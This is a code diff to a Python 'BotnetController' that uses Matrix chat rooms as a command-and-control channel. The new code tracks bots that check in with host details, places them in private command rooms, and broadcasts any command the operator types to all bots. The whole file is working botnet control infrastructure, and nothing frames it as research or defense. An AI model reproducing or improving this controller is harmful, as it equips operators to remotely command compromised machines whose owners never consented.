@@ -1,78 +1,144 @@
-import asyncio
-import nio
+from typing import Self
+import uuid
+from matrix_client.client import MatrixClient, Room
+from matrix_client.api import MatrixRequestError
+from requests.exceptions import MissingSchema
 import os
 import sys
 from dotenv import load_dotenv
+import json
+from dataclasses import dataclass
 
 load_dotenv()
-
-MATRIX_HOMESERVER = "https://matrix.org"
-USERNAME = "@ivan_lorrens_repo:matrix.org"  
+USER_NAME = os.getenv('USER_NAME')  
 PASSWORD = os.getenv('PASSWORD')
 ROOM_ID = os.getenv('ROOM_ID')
+COMMAND_ROOM_ID = os.getenv('COMMAND_ROOM_ID')
+MATRIX_HOMESERVER = "https://matrix.org"
+
+
+@dataclass
+class Bot:
+    hostname: str
+    platform: str
+    platform_version: str
+    machine: str
+    bot_id: str
+    python_version: str
+    
+    def __init__(self, data: dict):
+        self.hostname = data.get("hostname", "UNKNOWN")
+        self.platform = data.get("platform", "UNKNOWN")
+        self.platform_version = data.get("platform_version", "UNKNOWN")
+        self.machine = data.get("machine", "UNKNOWN")
+        self.bot_id = data.get("bot_id", "UNKNOWN")
+        self.python_version = data.get("python_version", "UNKNOWN")
+
+
+class CommandRoom:
+    bots: dict[str, Bot]
+    room: Room
+    
+    def __init__(self, room):
+        self.room = room
+        self.bots = {}
+        
+    def __str__(self):
+        return f"{self.bots}"
+    
+    def add_bot(self, bot_data) -> Bot:
+        bot: Bot = Bot(bot_data)
+        self.bots[bot.bot_id] = bot
+        return bot
+    
+    def send_cmd(self, cmd):
+        return self.room.send_text(cmd)
+        
 
 class BotnetController:
+    access_token: str
+    announce_room: Room
+    command_rooms: dict[str, CommandRoom]
+    
     def __init__(self):
         self.device_id = "BOTCONTROLLER"
-        self.client = nio.AsyncClient(
-            homeserver=MATRIX_HOMESERVER,
-            user=USERNAME,
-            device_id=self.device_id,
-        )
+        self.client = MatrixClient(MATRIX_HOMESERVER)
+        self.command_rooms = {}
 
-    async def login(self):
+    def login(self):
         # login and sync
-        response = await self.client.login(PASSWORD)
-        if isinstance(response, nio.LoginResponse):
-            print("[+] Logged in as controller.")
-            await self.client.sync(timeout=30000)
-            print("[+] Initial sync completed.")
-        else:
-            print(f"[!] Login failed: {response}")
-            sys.exit(1)
-
-    async def ensure_encryption(self):
-        # check if room is encrypted, if not, enable encryption
-        room = self.client.rooms.get(ROOM_ID)
-        if room and not room.encrypted:
-            print("[*] Room is not encrypted. Enabling encryption...")
-            await self.client.room_send(
-                room_id=ROOM_ID,
-                message_type="m.room.encryption",
-                content={"algorithm": "m.megolm.v1.aes-sha2"}
-            )
-            await self.client.sync(timeout=10000)  
-            print("[+] Encryption enabled for the room.")
-        else:
-            print("[+] Room is already encrypted.")
-
-    async def send_command(self, command):
         try:
-            response = await self.client.room_send(
-                room_id=ROOM_ID,
-                message_type="m.room.message",
-                content={"msgtype": "m.text", "body": command},
-            )
-            if isinstance(response, nio.RoomSendResponse):
-                print(f"[+] Sent encrypted command: {command}")
+            self.access_token = self.client.login(username=USER_NAME, password=PASSWORD)
+            print("[+] Logged in as controller.")
+        except MatrixRequestError as e:
+            print(e)
+            if e.code == 403:
+                print("Bad username or password.")
+                sys.exit(4)
             else:
-                print(f"[!] Failed to send command: {response}")
-        except nio.EncryptionError as e:
-            print(f"[!] Encryption error: {e}")
-            await self.client.sync(timeout=10000)
-            print("[*] Retrying after sync...")
-            await self.send_command(command)
+                print("Check your sever details are correct.")
+                sys.exit(2)
+        except MissingSchema as e:
+            print("Bad URL format.")
+            print(e)
+            sys.exit(3)
+            
+    def join_room(self, roomid) -> Room:
+        try:
+            room = self.client.rooms[roomid]
+        except KeyError:
+            room = self.client.join_room(roomid)
+        return room
+            
+    def join_rooms(self):
+        self.announce_room = self.join_room(ROOM_ID)
+        for cmdroom in [COMMAND_ROOM_ID]:
+            self.command_rooms[cmdroom] = CommandRoom(self.join_room(cmdroom))
 
-    async def run(self):
-        await self.login()
-        await self.ensure_encryption()
+    def send_command(self, command, room):
+        response = room.send_cmd(f"COMMAND:{command}")
+        # TODO: check for successfull response?
+        print(f"[+] Sent command: {command}")
+        
+    def send_to_all(self, command):
+        for id, cmd_room in self.command_rooms.items():
+            self.send_command(command, cmd_room)
+            
+    def assign_bot(self, botdata, roomid):
+        self.command_rooms[roomid].add_bot(botdata)
+
+    def on_message(self, room, event):
+        msgbody: str = event["content"]["body"]
+        if msgbody.startswith("CONNECT"):
+            msgbody = msgbody.removeprefix("CONNECT:")
+            msgbody = json.loads(msgbody)
+            botid = msgbody["bot_id"]
+            self.announce_room.send_text(
+                f"RESOLVE {botid}:{COMMAND_ROOM_ID}"
+            )
+            self.assign_bot(msgbody, COMMAND_ROOM_ID)
+            
+    def create_room(self, name) -> Room:
+        return self.client.create_room(name, is_public=False)
+    
+    def add_command_room(self):
+        new_room = self.create_room(f"commandroom{uuid.uuid4()}")
+        self.command_rooms[new_room.room_id] = CommandRoom(new_room)
+            
+    def run(self):
+        self.login()
+        self.join_rooms()
+        
+        self.announce_room.add_listener(self.on_message)
+        self.client.start_listener_thread()
+        
+        room = self.add_command_room()
         
         print("[+] Controller ready. Enter commands to send to bots.")
         while True:
             command = input("Enter command for bots: ")
-            await self.send_command(command)
-            await self.client.sync(timeout=10000, full_state=False)
+            self.send_to_all(command)
 
 if __name__ == "__main__":
     controller = BotnetController()
-    asyncio.run(controller.run())
+    controller.run()
